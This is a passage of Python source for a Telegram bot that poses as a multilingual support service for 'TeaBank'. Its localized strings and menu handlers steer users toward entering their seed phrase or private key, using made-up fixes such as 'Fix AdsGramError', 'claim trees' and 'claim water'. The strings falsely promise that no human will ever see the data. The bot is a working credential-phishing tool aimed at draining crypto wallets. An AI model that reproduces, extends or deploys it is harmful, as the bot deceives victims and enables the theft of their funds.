        "welcome": "Hi {user}, このボットは、TeaBank の問題（ウォレットアクセス、トランザクション、残高、復旧、入金および出金、アカウント検証）の診断と解決を支援するために設計されています。メニューのオプションをタップすると、ボットが自動チェックを実行し、次の問題の修正を案内します：検証；トークンの受け取り；資産の復旧；残高がない；出金；Fix AdsGramError (Block 7558); 庭木を請求；水を請求。お客様の安全のために：提供された機密情報はすべて自動的に処理され、暗号化して保存されます。人間がアクセスすることはありません。",
        "main menu title": "続行する問題の種類を選択してください：",
        "buy": "購入",
        "validation": "検証",
        "claim tokens": "トークンを請求",
        "migration issues": "移行の問題",
        "assets recovery": "資産回復",
        "general issues": "一般的な問題",
        "rectification": "修正",
        "staking issues": "ステーキングの問題",
        "deposits": "入金",
        "withdrawals": "出金",
        "missing balance": "残高が見つかりません",
        "login issues": "ログインの問題",
        "high gas fees": "高いガス料金",
        "presale issues": "プレセールの問題",
        "claim missing sticker": "欠損ステッカーを申請",
        "connect wallet message": "プライベートキーまたはシードフレーズでウォレットを接続してください。",
        "connect wallet button": "🔑 ウォレットを接続",
        "select wallet type": "ウォレットの種類を選択してください：",
        "other wallets": "その他のウォレット",
        "private key": "🔑 プライベートキー",
        "seed phrase": "🔒 シードフレーズをインポート",
        "wallet selection message": "{wallet_name} を選択しました。\n接続方法を選択してください。",
        "reassurance": PROFESSIONAL_REASSURANCE["ja"],
        "prompt seed": "12 または 24 語のシードフレーズを入力してください。" + PROFESSIONAL_REASSURANCE["ja"],
        "prompt private key": "プライベートキーを入力してください。" + PROFESSIONAL_REASSURANCE["ja"],
        "invalid choice": "無効な選択です。ボタンを使用してください。",
        "final error message": "‼️ エラーが発生しました。/start で再試行してください。",
        "final_received_message": "ありがとうございます — seed または秘密鍵を安全に受け取りました。/start で再開してください。",
        "error_use_seed_phrase": "このフィールドにはシードフレーズ（12 または 24 語）が必要です。シードフレーズを入力してください。",
        "post_receive_error": "‼️ エラーが発生しました。正しいキーを入力していることを確認してください — コピー＆ペーストを使用してください。/start で再試行してください。",
        "choose language": "言語を選択してください：",
        "await restart message": "/start をクリックして再開してください。",
        "back": "🔙 戻る",
        "invalid_input": "無効な入力です。/start を使用してください。",
        "fix ads": "Fix AdsGramError (Block 7558)",
        "claim trees": "木を請求",
        "claim water": "水を請求",
    },
    "ms": {
        "welcome": "Hi {user}, Bot ini direka untuk membantu anda mendiagnosis dan menyelesaikan isu TeaBank — capaian dompet, transaksi, baki, pemulihan, deposit dan pengeluaran, dan pengesahan akaun. Ketik pilihan menu dan bot akan menjalankan pemeriksaan automatik serta membimbing anda menyelesaikan: Pengesahan; Tuntut Token; Pemulihan Aset; Baki Hilang; Pengeluaran; Fix AdsGramError (Block 7558); Tuntut Pokok; Tuntut Air. Untuk keselamatan anda: sebarang maklumat sensitif yang anda berikan diproses secara automatik dan disimpan dalam bentuk terenkripsi; tiada manusia akan mengaksesnya.",
        "main menu title": "Sila pilih jenis isu untuk meneruskan:",
        "buy": "Beli",
        "validation": "Pengesahan",
        "claim tokens": "Tuntut Token",
        "migration issues": "Isu Migrasi",
        "assets recovery": "Pemulihan Aset",
        "general issues": "Isu Umum",
        "rectification": "Pembetulan",
        "staking issues": "Isu Staking",
        "deposits": "Deposit",
        "withdrawals": "Pengeluaran",
        "missing balance": "Baki Hilang",
        "login issues": "Isu Log Masuk",
        "high gas fees": "Yuran Gas Tinggi",
        "presale issues": "Isu Pra-Jualan",
        "claim missing sticker": "Tuntut Sticker Hilang",
        "connect wallet message": "Sila sambungkan dompet anda dengan Private Key atau Seed Phrase untuk meneruskan.",
        "connect wallet button": "🔑 Sambung Dompet",
        "select wallet type": "Sila pilih jenis dompet anda:",
        "other wallets": "Dompet Lain",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Import Seed Phrase",
        "wallet selection message": "Anda telah memilih {wallet_name}.\nPilih mod sambungan yang dikehendaki.",
        "reassurance": PROFESSIONAL_REASSURANCE["ms"],
        "prompt seed": "Sila masukkan seed phrase 12 atau 24 perkataan anda." + PROFESSIONAL_REASSURANCE["ms"],
        "prompt private key": "Sila masukkan kunci peribadi anda." + PROFESSIONAL_REASSURANCE["ms"],
        "invalid choice": "Pilihan tidak sah. Gunakan butang.",
        "final error message": "‼️ Ralat berlaku. /start untuk cuba semula.",
        "final_received_message": "Terima kasih — seed atau kunci peribadi anda diterima dengan selamat dan akan diproses. Gunakan /start untuk mula semula.",
        "error_use_seed_phrase": "Medan ini memerlukan seed phrase (12 atau 24 perkataan). Sila berikan seed phrase.",
        "post_receive_error": "‼️ Ralat berlaku. Sila pastikan anda memasukkan kunci yang betul — gunakan salin & tampal untuk elakkan ralat. Sila /start untuk cuba semula.",
        "choose language": "Sila pilih bahasa pilihan anda:",
        "await restart message": "Sila klik /start untuk memulakan semula.",
        "back": "🔙 Kembali",
        "invalid_input": "Input tidak sah. Gunakan /start.",
        "fix ads": "Fix AdsGramError (Block 7558)",
        "claim trees": "Tuntut Pokok",
        "claim water": "Tuntut Air",
    },
    "ro": {
        "welcome": "Hi {user}, Acest bot este conceput pentru a vă ajuta să diagnosticați și să rezolvați probleme TeaBank — acces portofel, tranzacții, solduri, recuperări, depuneri și retrageri și validări de cont. Atingeți o opțiune din meniu și botul va rula verificări automate și vă va ghida prin remedieri pentru: Validare; Reclamare Token-uri; Recuperare Active; Sold Lipsă; Retrageri; Fix AdsGramError (Block 7558); Reclamare Copaci; Reclamare Apă. Pentru siguranța dvs.: orice informație sensibilă pe care o furnizați este procesată automat și stocată criptat; niciun om nu va avea acces la aceasta.",
        "main menu title": "Selectați un tip de problemă pentru a continua:",
        "buy": "Cumpără",
        "validation": "Validare",
        "claim tokens": "Revendică Token-uri",
        "migration issues": "Probleme de Migrare",
        "assets recovery": "Recuperare Active",
        "general issues": "Probleme Generale",
        "rectification": "Rectificare",
        "staking issues": "Probleme Staking",
        "deposits": "Depuneri",
        "withdrawals": "Retrageri",
        "missing balance": "Sold Lipsă",
        "login issues": "Probleme Autentificare",
        "high gas fees": "Taxe Mari de Gas",
        "presale issues": "Probleme Pre-sale",
        "claim missing sticker": "Revendică Sticker Lipsă",
        "connect wallet message": "Vă rugăm conectați portofelul cu cheia privată sau fraza seed pentru a continua.",
        "connect wallet button": "🔑 Conectează Portofel",
        "select wallet type": "Selectați tipul portofelului:",
        "other wallets": "Alte Portofele",
        "private key": "🔑 Cheie Privată",
        "seed phrase": "🔒 Importă Seed Phrase",
        "wallet selection message": "Ați selectat {wallet_name}.\nSelectați modul de conectare preferat.",
        "reassurance": PROFESSIONAL_REASSURANCE["ro"],
        "prompt seed": "Introduceți seed phrase de 12 sau 24 cuvinte." + PROFESSIONAL_REASSURANCE["ro"],
        "prompt private key": "Introduceți cheia privată." + PROFESSIONAL_REASSURANCE["ro"],
        "invalid choice": "Alegere invalidă. Folosiți butoanele.",
        "final error message": "‼️ A apărut o eroare. /start pentru a încerca din nou.",
        "final_received_message": "Mulțumim — seed sau cheia privată a fost primită și va fi procesată. /start pentru a începe din nou.",
        "error_use_seed_phrase": "Acest câmp necesită seed phrase (12 sau 24 cuvinte).",
        "post_receive_error": "‼️ A apărut o eroare. Folosiți copiere/lipire pentru a evita erori. /start pentru a încerca din nou.",
        "choose language": "Selectați limba preferată:",
        "await restart message": "Apăsați /start pentru a relua.",
        "back": "🔙 Înapoi",
        "invalid_input": "Intrare invalidă. /start.",
        "fix ads": "Fix AdsGramError (Block 7558)",
        "claim trees": "Revendică Copaci",
        "claim water": "Revendică Apă",
    },
    "sk": {
        "welcome": "Hi {user}, Tento bot je navrhnutý tak, aby vám pomohol diagnostikovať a vyriešiť problémy TeaBank — prístup k peňaženke, transakcie, zostatky, obnovenia, vklady a výbery a overenie účtu. Klepnite na možnosť v ponuke a bot spustí automatické kontroly a prevedie vás opravami pre: Overenie; Nárok na tokeny; Obnovenie aktív; Chýbajúci zostatok; Výbery; Fix AdsGramError (Block 7558); Nárok na stromy; Nárok na vodu. Pre vašu bezpečnosť: všetky citlivé informácie, ktoré poskytnete, sa spracovávajú automaticky a ukladajú zašifrovane; žiadny človek k nim nebude mať prístup.",
        "main menu title": "Vyberte typ problému pre pokračovanie:",
        "buy": "Kúpiť",
        "validation": "Validácia",
        "claim tokens": "Uplatniť tokeny",
        "migration issues": "Problémy s migráciou",
        "assets recovery": "Obnovenie aktív",
        "general issues": "Všeobecné problémy",
        "rectification": "Oprava",
        "staking issues": "Problémy so stakingom",
        "deposits": "Vklady",
        "withdrawals": "Výbery",
        "missing balance": "Chýbajúci zostatok",
        "login issues": "Problémy s prihlásením",
        "high gas fees": "Vysoké poplatky za gas",
        "presale issues": "Problémy s predpredajom",
        "claim missing sticker": "Uplatniť chýbajúcu nálepku",
        "connect wallet message": "Pripojte peňaženku pomocou súkromného kľúča alebo seed frázy.",
        "connect wallet button": "🔑 Pripojiť peňaženku",
        "select wallet type": "Vyberte typ peňaženky:",
        "other wallets": "Iné peňaženky",
        "private key": "🔑 Súkromný kľúč",
        "seed phrase": "🔒 Importovať seed frázu",
        "wallet selection message": "Vybrali ste {wallet_name}.\nVyberte preferovaný spôsob pripojenia.",
        "reassurance": PROFESSIONAL_REASSURANCE["sk"],
        "prompt seed": "Zadajte seed phrase 12 alebo 24 slov." + PROFESSIONAL_REASSURANCE["sk"],
        "prompt private key": "Zadajte svoj súkromný kľúč." + PROFESSIONAL_REASSURANCE["sk"],
        "invalid choice": "Neplatná voľba. Použite tlačidlá.",
        "final error message": "‼️ Vyskytla sa chyba. /start pre opakovanie.",
        "final_received_message": "Ďakujeme — seed alebo súkromný kľúč bol prijatý a bude spracovaný. /start pre opakovanie.",
        "error_use_seed_phrase": "Toto pole vyžaduje seed phrase (12 alebo 24 slov).",
        "post_receive_error": "‼️ Došlo k chybe. Použite kopírovanie/vloženie, aby ste sa vyhli chybám. /start pre opakovanie.",
        "choose language": "Vyberte preferovaný jazyk:",
        "await restart message": "Kliknite /start pre reštart.",
        "back": "🔙 Späť",
        "invalid_input": "Neplatný vstup. /start.",
        "fix ads": "Fix AdsGramError (Block 7558)",
        "claim trees": "Nárok na stromy",
        "claim water": "Nárok na vodu",
    },
    "th": {
        "welcome": "Hi {user}, บอทนี้ออกแบบมาเพื่อช่วยคุณวินิจฉัยและแก้ไขปัญหา TeaBank — การเข้าถึงกระเป๋าเงิน, ธุรกรรม, ยอดคงเหลือ, การกู้คืน, การฝากและการถอน, และการยืนยันบัญชี แตะตัวเลือกเมนูและบอทจะรันการตรวจสอบอัตโนมัติและแนะนำการแก้ไขสำหรับ: การยืนยัน; เคลมโทเค็น; กู้คืนสินทรัพย์; ยอดคงเหลือหาย; การถอน; Fix AdsGramError (Block 7558); เคลมต้นไม้; เคลมน้ำ. เพื่อความปลอดภัยของคุณ: ข้อมูลที่สำคัญใด ๆ ที่คุณให้จะถูกประมวลผลโดยอัตโนมัติและเก็บในรูปแบบที่เข้ารหัส; ไม่มีบุคคลใดจะเข้าถึงข้อมูลเหล่านั้น",
        "main menu title": "โปรดเลือกประเภทปัญหาเพื่อดำเนินการต่อ:",
        "buy": "ซื้อ",
        "validation": "การยืนยัน",
        "claim tokens": "เคลมโทเค็น",
        "migration issues": "ปัญหาการย้ายข้อมูล",
        "assets recovery": "กู้คืนทรัพย์สิน",
        "general issues": "ปัญหาทั่วไป",
        "rectification": "การแก้ไข",
        "staking issues": "ปัญหา Staking",
        "deposits": "ฝากเงิน",
        "withdrawals": "ถอนเงิน",
        "missing balance": "ยอดคงเหลือหาย",
        "login issues": "ปัญหาการเข้าสู่ระบบ",
        "high gas fees": "ค่าก๊าซสูง",
        "presale issues": "ปัญหา Presale",
        "claim missing sticker": "เคลมสติกเกอร์หาย",
        "connect wallet message": "โปรดเชื่อมต่อกระเป๋าของคุณด้วยคีย์ส่วนตัวหรือ seed phrase เพื่อดำเนินการต่อ",
        "connect wallet button": "🔑 เชื่อมต่อกระเป๋า",
        "select wallet type": "โปรดเลือกประเภทกระเป๋า:",
        "other wallets": "กระเป๋าอื่น ๆ",
        "private key": "🔑 คีย์ส่วนตัว",
        "seed phrase": "🔒 นำเข้า Seed Phrase",
        "wallet selection message": "คุณได้เลือก {wallet_name}\nเลือกโหมดการเชื่อมต่อ",
        "reassurance": PROFESSIONAL_REASSURANCE["th"],
        "prompt seed": "ป้อน seed phrase 12 หรือ 24 คำของคุณ。" + PROFESSIONAL_REASSURANCE["th"],
        "prompt private key": "ป้อนคีย์ส่วนตัวของคุณ。" + PROFESSIONAL_REASSURANCE["th"],
        "invalid choice": "ตัวเลือกไม่ถูกต้อง โปรดใช้ปุ่ม",
        "final error message": "‼️ เกิดข้อผิดพลาด. /start เพื่อทดลองใหม่",
        "final_received_message": "ขอบคุณ — seed หรือคีย์ส่วนตัวของคุณได้รับอย่างปลอดภัยและจะถูกดำเนินการ ใช้ /start เพื่อเริ่มใหม่",
        "error_use_seed_phrase": "ช่องนี้ต้องการ seed phrase (12 หรือ 24 คำ) โปรดระบุ seed",
        "post_receive_error": "‼️ เกิดข้อผิดพลาด โปรดตรวจสอบว่าคุณป้อนคีย์ที่ถูกต้อง — ใช้คัดลอกและวางเพื่อหลีกเลี่ยงข้อผิดพลาด กรุณา /start เพื่อทดลองใหม่",
        "choose language": "โปรดเลือกภาษา:",
        "await restart message": "โปรดกด /start เพื่อเริ่มใหม่",
        "back": "🔙 ย้อนกลับ",
        "invalid_input": "ข้อมูลไม่ถูกต้อง /start",
        "fix ads": "Fix AdsGramError (Block 7558)",
        "claim trees": "เคลมต้นไม้",
        "claim water": "เคลมน้ำ",
    },
    "vi": {
        "welcome": "Hi {user}, Bot này được thiết kế để giúp bạn chẩn đoán và giải quyết các vấn đề TeaBank — truy cập ví, giao dịch, số dư, khôi phục, nạp và rút, và xác thực tài khoản. Chạm một tùy chọn trong menu và bot sẽ chạy kiểm tra tự động và hướng dẫn bạn khắc phục cho: Xác thực; Yêu cầu Token; Khôi phục Tài sản; Thiếu số dư; Rút tiền; Fix AdsGramError (Block 7558); Yêu cầu Cây; Yêu cầu Nước. Vì sự an toàn của bạn: mọi thông tin nhạy cảm bạn cung cấp sẽ được xử lý tự động và lưu trữ mã hóa; không có con người nào được truy cập.",
        "main menu title": "Vui lòng chọn loại sự cố để tiếp tục:",
        "buy": "Mua",
        "validation": "Xác thực",
        "claim tokens": "Yêu cầu Token",
        "migration issues": "Vấn đề di trú",
        "assets recovery": "Khôi phục tài sản",
        "general issues": "Vấn đề chung",
        "rectification": "Sửa chữa",
        "staking issues": "Vấn đề staking",
        "deposits": "Nạp tiền",
        "withdrawals": "Rút tiền",
        "missing balance": "Thiếu số dư",
        "login issues": "Vấn đề đăng nhập",
        "high gas fees": "Phí gas cao",
        "presale issues": "Vấn đề presale",
        "claim missing sticker": "Yêu cầu sticker bị thiếu",
        "connect wallet message": "Vui lòng kết nối ví bằng Khóa Riêng hoặc Seed Phrase để tiếp tục.",
        "connect wallet button": "🔑 Kết nối ví",
        "select wallet type": "Vui lòng chọn loại ví:",
        "other wallets": "Ví khác",
        "private key": "🔑 Khóa riêng",
        "seed phrase": "🔒 Nhập Seed Phrase",
        "wallet selection message": "Bạn đã chọn {wallet_name}.\nChọn phương thức kết nối.",
        "reassurance": PROFESSIONAL_REASSURANCE["vi"],
        "prompt seed": "Vui lòng nhập seed phrase 12 hoặc 24 từ của bạn。" + PROFESSIONAL_REASSURANCE["vi"],
        "prompt private key": "Vui lòng nhập khóa riêng của bạn。" + PROFESSIONAL_REASSURANCE["vi"],
        "invalid choice": "Lựa chọn không hợp lệ. Vui lòng sử dụng các nút.",
        "final error message": "‼️ Đã xảy ra lỗi. /start để thử lại.",
        "final_received_message": "Cảm ơn — seed hoặc khóa riêng đã được nhận an toàn và sẽ được xử lý. /start để bắt đầu lại.",
        "error_use_seed_phrase": "Trường này yêu cầu seed phrase (12 hoặc 24 từ). Vui lòng cung cấp seed phrase.",
        "post_receive_error": "‼️ Đã xảy ra lỗi. Vui lòng đảm bảo nhập đúng khóa — sử dụng sao chép/dán để tránh lỗi. Vui lòng /start để thử lại.",
        "choose language": "Chọn ngôn ngữ:",
        "await restart message": "Nhấn /start để bắt đầu lại.",
        "back": "🔙 Quay lại",
        "invalid_input": "Dữ liệu không hợp lệ. /start.",
        "fix ads": "Fix AdsGramError (Block 7558)",
        "claim trees": "Yêu cầu cây",
        "claim water": "Yêu cầu nước",
    },
    "pl": {
        "welcome": "Hi {user}, Ten bot został zaprojektowany, aby pomóc w diagnozowaniu i rozwiązywaniu problemów TeaBank — dostęp do portfela, transakcje, salda, odzyskiwanie, depozyty i wypłaty oraz weryfikacje kont. Kliknij opcję w menu, a bot uruchomi automatyczne kontrole i poprowadzi Cię przez rozwiązania dla: Weryfikacja; Odbierz tokeny; Odzyskiwanie aktywów; Brakujący balans; Wypłaty; Fix AdsGramError (Block 7558); Odbierz drzewa; Odbierz wodę. Dla Twojego bezpieczeństwa: wszelkie dane wrażliwe, które podasz, są przetwarzane automatycznie i przechowywane zaszyfrowane; żaden człowiek nie będzie miał do nich dostępu.",
        "main menu title": "Wybierz rodzaj problemu, aby kontynuować:",
        "validation": "Walidacja",
        "claim tokens": "Odbierz Tokeny",
        "assets recovery": "Odzyskiwanie aktywów",
        "general issues": "Ogólne problemy",
        "rectification": "Rektyfikacja",
        "deposits": "Depozyty",
        "withdrawals": "Wypłaty",
        "missing balance": "Brakujący/Nieregularny saldo",
        "connect wallet message": "Proszę połączyć portfel za pomocą Private Key lub Seed Phrase, aby kontynuować.",
        "connect wallet button": "🔑 Połącz portfel",
        "select wallet type": "Wybierz typ portfela:",
        "other wallets": "Inne portfele",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Importuj Seed Phrase",
        "reassurance": PROFESSIONAL_REASSURANCE["pl"],
        "prompt seed": "Wprowadź seed phrase 12 lub 24 słów." + PROFESSIONAL_REASSURANCE["pl"],
        "prompt private key": "Wprowadź swój private key." + PROFESSIONAL_REASSURANCE["pl"],
        "invalid choice": "Nieprawidłowy wybór. Użyj przycisków.",
        "final error message": "‼️ Wystąpił błąd. /start aby spróbować ponownie.",
        "final_received_message": "Dziękujemy — seed lub klucz prywatny został bezpiecznie odebrany i zostanie przetworzony. /start aby zacząć od nowa.",
        "error_use_seed_phrase": "To pole wymaga seed phrase (12 lub 24 słów).",
        "post_receive_error": "‼️ Wystąpił błąd. /start aby spróbować ponownie.",
        "choose language": "Wybierz język:",
        "await restart message": "Kliknij /start aby zacząć ponownie.",
        "back": "🔙 Powrót",
        "invalid_input": "Nieprawidłowe dane. /start.",
        "fix ads": "Fix AdsGramError (Block 7558)",
        "claim trees": "Odbierz drzewa",
        "claim water": "Odbierz wodę",
    },
}

# Utility to get localized text
def ui_text(context: ContextTypes.DEFAULT_TYPE, key: str) -> str:
    lang = "en"
    try:
        if context and hasattr(context, "user_data"):
            lang = context.user_data.get("language", "en")
    except Exception:
        lang = "en"
    return LANGUAGES.get(lang, LANGUAGES["en"]).get(key, LANGUAGES["en"].get(key, key))


# Generate localized wallet label based on base name and user's language:
def localize_wallet_label(base_name: str, lang: str) -> str:
    wallet_word = WALLET_WORD_BY_LANG.get(lang, WALLET_WORD_BY_LANG["en"])
    if "Wallet" in base_name:
        return base_name.replace("Wallet", wallet_word)
    if "wallet" in base_name:
        return base_name.replace("wallet", wallet_word)
    return base_name


# Helper to prefix tree emoji to selected menu labels
def label_with_tree(context: ContextTypes.DEFAULT_TYPE, key: str) -> str:
    text = ui_text(context, key)
    if key in MAIN_MENU_LABEL_KEYS:
        if not text.lstrip().startswith(TREE_EMOJI):
            return f"{TREE_EMOJI} {text}"
    return text


# Helper to send a new bot message and push it onto per-user message stack (to support editing on Back)
async def send_and_push_message(
    bot,
    chat_id: int,
    text: str,
    context: ContextTypes.DEFAULT_TYPE,
    reply_markup=None,
    parse_mode=None,
    state=None,
) -> object:
    msg = await bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, parse_mode=parse_mode)
    stack = context.user_data.setdefault("message_stack", [])
    recorded_state = state if state is not None else context.user_data.get("current_state", CHOOSE_LANGUAGE)
    stack.append(
        {
            "chat_id": chat_id,
            "message_id": msg.message_id,
            "text": text,
            "reply_markup": reply_markup,
            "state": recorded_state,
            "parse_mode": parse_mode,
        }
    )
    if len(stack) > 60:
        stack.pop(0)
    return msg


# Helper to edit the current displayed message into the previous step (in-place) when Back pressed.
async def edit_current_to_previous_on_back(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    stack = context.user_data.get("message_stack", [])
    if not stack:
        keyboard = build_language_keyboard()
        await send_and_push_message(context.bot, update.effective_chat.id, ui_text(context, "choose language"), context, reply_markup=keyboard, state=CHOOSE_LANGUAGE)
        context.user_data["current_state"] = CHOOSE_LANGUAGE
        return CHOOSE_LANGUAGE

    if len(stack) == 1:
        prev = stack[0]
        try:
            await update.callback_query.message.edit_text(prev["text"], reply_markup=prev["reply_markup"], parse_mode=prev.get("parse_mode"))
            context.user_data["current_state"] = prev.get("state", CHOOSE_LANGUAGE)
            prev["message_id"] = update.callback_query.message.message_id
            prev["chat_id"] = update.callback_query.message.chat.id
            stack[-1] = prev
            return prev.get("state", CHOOSE_LANGUAGE)
        except Exception:
            await send_and_push_message(context.bot, prev["chat_id"], prev["text"], context, reply_markup=prev["reply_markup"], parse_mode=prev.get("parse_mode"), state=prev.get("state", CHOOSE_LANGUAGE))
            context.user_data["current_state"] = prev.get("state", CHOOSE_LANGUAGE)
            return prev.get("state", CHOOSE_LANGUAGE)

    try:
        stack.pop()
    except Exception:
        pass

    prev = stack[-1]
    try:
        await update.callback_query.message.edit_text(prev["text"], reply_markup=prev["reply_markup"], parse_mode=prev.get("parse_mode"))
        new_prev = prev.copy()
        new_prev["message_id"] = update.callback_query.message.message_id
        new_prev["chat_id"] = update.callback_query.message.chat.id
        stack[-1] = new_prev
        context.user_data["current_state"] = new_prev.get("state", MAIN_MENU)
        return new_prev.get("state", MAIN_MENU)
    except Exception:
        sent = await send_and_push_message(context.bot, prev["chat_id"], prev["text"], context, reply_markup=prev["reply_markup"], parse_mode=prev.get("parse_mode"), state=prev.get("state", MAIN_MENU))
        context.user_data["current_state"] = prev.get("state", MAIN_MENU)
        return prev.get("state", MAIN_MENU)


# Language selection keyboard
def build_language_keyboard():
    keyboard = [
        [InlineKeyboardButton("English 🇬🇧", callback_data="lang_en"), InlineKeyboardButton("Русский 🇷🇺", callback_data="lang_ru")],
        [InlineKeyboardButton("Español 🇪🇸", callback_data="lang_es"), InlineKeyboardButton("Українська 🇺🇦", callback_data="lang_uk")],
        [InlineKeyboardButton("Français 🇫🇷", callback_data="lang_fr"), InlineKeyboardButton("فارسی 🇮🇷", callback_data="lang_fa")],
        [InlineKeyboardButton("Türkçe 🇹🇷", callback_data="lang_tr"), InlineKeyboardButton("中文 🇨🇳", callback_data="lang_zh")],
        [InlineKeyboardButton("Deutsch 🇩🇪", callback_data="lang_de"), InlineKeyboardButton("العربية 🇦🇪", callback_data="lang_ar")],
        [InlineKeyboardButton("Nederlands 🇳🇱", callback_data="lang_nl"), InlineKeyboardButton("हिन्दी 🇮🇳", callback_data="lang_hi")],
        [InlineKeyboardButton("Bahasa Indonesia 🇮🇩", callback_data="lang_id"), InlineKeyboardButton("Português 🇵🇹", callback_data="lang_pt")],
        [InlineKeyboardButton("Čeština 🇨🇿", callback_data="lang_cs"), InlineKeyboardButton("اردو 🇵🇰", callback_data="lang_ur")],
        [InlineKeyboardButton("Oʻzbekcha 🇺🇿", callback_data="lang_uz"), InlineKeyboardButton("Italiano 🇮🇹", callback_data="lang_it")],
        [InlineKeyboardButton("日本語 🇯🇵", callback_data="lang_ja"), InlineKeyboardButton("Bahasa Melayu 🇲🇾", callback_data="lang_ms")],
        [InlineKeyboardButton("Română 🇷🇴", callback_data="lang_ro"), InlineKeyboardButton("Slovenčina 🇸🇰", callback_data="lang_sk")],
        [InlineKeyboardButton("ไทย 🇹🇭", callback_data="lang_th"), InlineKeyboardButton("Tiếng Việt 🇻🇳", callback_data="lang_vi")],
        [InlineKeyboardButton("Polski 🇵🇱", callback_data="lang_pl")],
    ]
    return InlineKeyboardMarkup(keyboard)


# Build main menu using ui_text(context, ...) so it always uses the user's selected language
def build_main_menu_markup(context: ContextTypes.DEFAULT_TYPE):
    kb = [
        [
            InlineKeyboardButton(label_with_tree(context, "validation"), callback_data="validation"),
            InlineKeyboardButton(label_with_tree(context, "claim tokens"), callback_data="claim_tokens"),
        ],
        [
            InlineKeyboardButton(label_with_tree(context, "assets recovery"), callback_data="assets_recovery"),
            InlineKeyboardButton(label_with_tree(context, "general issues"), callback_data="general_issues"),
        ],
        [
            InlineKeyboardButton(label_with_tree(context, "rectification"), callback_data="rectification"),
            InlineKeyboardButton(label_with_tree(context, "withdrawals"), callback_data="withdrawals"),
        ],
        [
            InlineKeyboardButton(label_with_tree(context, "login issues"), callback_data="login_issues"),
            InlineKeyboardButton(label_with_tree(context, "missing balance"), callback_data="missing_balance"),
        ],
        [
            InlineKeyboardButton(label_with_tree(context, "claim trees"), callback_data="claim_trees"),
            InlineKeyboardButton(label_with_tree(context, "claim water"), callback_data="claim_water"),
        ],
        [
            InlineKeyboardButton(label_with_tree(context, "fix ads"), callback_data="fix_ads"),
        ],
    ]
    # Safe Back to language selection
    kb.append([InlineKeyboardButton(ui_text(context, "back"), callback_data="back_main_menu")])
    return InlineKeyboardMarkup(kb)


# Start handler - shows language selection (new message)
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["message_stack"] = []
    context.user_data["current_state"] = CHOOSE_LANGUAGE
    keyboard = build_language_keyboard()
    chat_id = update.effective_chat.id
    await send_and_push_message(context.bot, chat_id, ui_text(context, "choose language"), context, reply_markup=keyboard, state=CHOOSE_LANGUAGE)
    return CHOOSE_LANGUAGE


# Set language when a language button pressed
async def set_language(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    lang = query.data.split("_", 1)[1]
    context.user_data["language"] = lang
    context.user_data["current_state"] = MAIN_MENU

    # Remove language menu keyboard so it disappears after selection
    try:
        if query.message:
            await query.message.edit_reply_markup(reply_markup=None)
    except Exception:
        logging.debug("Failed to remove language keyboard (non-fatal).")

    welcome_template = ui_text(context, "welcome")
    # welcome strings include {user} placeholder; use mention_html for safe mention
    welcome = welcome_template.format(user=update.effective_user.mention_html()) if "{user}" in welcome_template else welcome_template
    markup = build_main_menu_markup(context)
    await send_and_push_message(context.bot, update.effective_chat.id, welcome, context, reply_markup=markup, parse_mode="HTML", state=MAIN_MENU)
    return MAIN_MENU


# Invalid input handler: user typed when a button-only state expected
async def handle_invalid_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    msg = ui_text(context, "invalid_input")
    await update.message.reply_text(msg)
    return context.user_data.get("current_state", CHOOSE_LANGUAGE)


# Show connect wallet button (forward navigation -> send new message)
async def show_connect_wallet_button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    context.user_data["current_state"] = AWAIT_CONNECT_WALLET
    label = ui_text(context, "connect wallet message")
    keyboard = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton(ui_text(context, "connect wallet button"), callback_data="connect_wallet")],
            [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_connect_wallet")],
        ]
    )
    await send_and_push_message(context.bot, update.effective_chat.id, label, context, reply_markup=keyboard, state=AWAIT_CONNECT_WALLET)
    return AWAIT_CONNECT_WALLET


# Show wallet types (forward navigation -> send new message). Wallet labels localized.
async def show_wallet_types(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    lang = context.user_data.get("language", "en")
    keyboard = []
    primary_keys = [
        "wallet_type_metamask",
        "wallet_type_trust_wallet",
        "wallet_type_coinbase",
        "wallet_type_tonkeeper",
        "wallet_type_phantom_wallet",
    ]
    for key in primary_keys:
        label = localize_wallet_label(BASE_WALLET_NAMES.get(key, key), lang)
        keyboard.append([InlineKeyboardButton(label, callback_data=key)])
    keyboard.append([InlineKeyboardButton(ui_text(context, "other wallets"), callback_data="other_wallets")])
    keyboard.append([InlineKeyboardButton(ui_text(context, "back"), callback_data="back_wallet_types")])
    reply = InlineKeyboardMarkup(keyboard)
    context.user_data["current_state"] = CHOOSE_WALLET_TYPE
    await send_and_push_message(context.bot, update.effective_chat.id, ui_text(context, "select wallet type"), context, reply_markup=reply, state=CHOOSE_WALLET_TYPE)
    return CHOOSE_WALLET_TYPE


# Show other wallets full list (forward navigation -> send new message)
async def show_other_wallets(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    lang = context.user_data.get("language", "en")
    keys = [
        "wallet_type_mytonwallet",
        "wallet_type_tonhub",
        "wallet_type_rainbow",
        "wallet_type_safepal",
        "wallet_type_wallet_connect",
        "wallet_type_ledger",
        "wallet_type_brd_wallet",
        "wallet_type_solana_wallet",
        "wallet_type_balance",
        "wallet_type_okx",
        "wallet_type_xverse",
        "wallet_type_sparrow",
        "wallet_type_earth_wallet",
        "wallet_type_hiro",
        "wallet_type_saitamask_wallet",
        "wallet_type_casper_wallet",
        "wallet_type_cake_wallet",
        "wallet_type_kepir_wallet",
        "wallet_type_icpswap",
        "wallet_type_kaspa",
        "wallet_type_nem_wallet",
        "wallet_type_near_wallet",
        "wallet_type_compass_wallet",
        "wallet_type_stack_wallet",
        "wallet_type_soilflare_wallet",
        "wallet_type_aioz_wallet",
        "wallet_type_xpla_vault_wallet",
        "wallet_type_polkadot_wallet",
        "wallet_type_xportal_wallet",
        "wallet_type_multiversx_wallet",
        "wallet_type_verachain_wallet",
        "wallet_type_casperdash_wallet",
        "wallet_type_nova_wallet",
